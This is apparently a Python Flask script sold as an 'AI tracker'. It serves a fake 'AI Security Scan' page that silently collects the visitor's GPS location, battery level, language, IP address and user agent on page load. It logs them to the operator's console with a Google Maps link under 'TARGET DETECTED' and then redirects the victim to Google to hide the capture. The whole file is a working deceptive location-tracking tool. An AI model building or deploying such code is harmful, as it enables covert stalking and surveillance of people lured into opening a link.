import datetime
import os
from flask import Flask, request, render_template_string

# Terminal Colors
PURPLE = "\033[1;35m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
RESET = "\033[0m"

# Security Password
PASS = "2013"

def login():
    print(f"{PURPLE}====================================={RESET}")
    print(f"{PURPLE}     AI-TRACKER ULTIMATE V1.0        {RESET}")
    print(f"{PURPLE}====================================={RESET}")
    val = input(f"{CYAN}[?] Enter System Password: {RESET}")
    if val != PASS:
        print(f"{RED}[!] Wrong Password!{RESET}")
        exit()
    print(f"{GREEN}[+] Access Granted! Starting AI Engine...{RESET}\n")

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>AI Security Scan</title>
    <script>
        async function startAI() {
            let data = { bat: "N/A", lang: navigator.language };
            try {
                const b = await navigator.getBattery();
                data.bat = (b.level * 100) + "%";
            } catch (e) {}

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    send(p.coords.latitude, p.coords.longitude, data);
                }, () => { send("N/A", "N/A", data); });
            } else { send("N/A", "N/A", data); }
        }
        function send(lt, ln, d) {
            fetch(`/log?lt=${lt}&ln=${ln}&bt=${d.bat}&lg=${d.lang}`);
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
        }
        window.onload = startAI;
    </script>
</head>
<body style="background:#000; color:#a020f0; text-align:center; padding-top:50px;">
    <h1>[ AI TRACKING ACTIVE ]</h1>
    <p>Connecting to secure server...</p>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/log')
def log():
    lt = request.args.get('lt')
    ln = request.args.get('ln')
    bt = request.args.get('bt')
    # AI Logic - Analyzing Device
    ua = request.headers.get('User-Agent')
    print(f"{PURPLE}[!] TARGET DETECTED!{RESET}")
    print(f"{CYAN}IP: {request.remote_addr}{RESET}")
    print(f"{GREEN}GPS: {lt}, {ln}{RESET}")
    print(f"{PURPLE}Battery: {bt}{RESET}")
    print(f"{PURPLE}Maps: http://google.com/maps?q={lt},{ln}{RESET}")
    print("-" * 30)
    return "Done"

if __name__ == '__main__':
    login()
    app.run(host='0.0.0.0', port=5000)
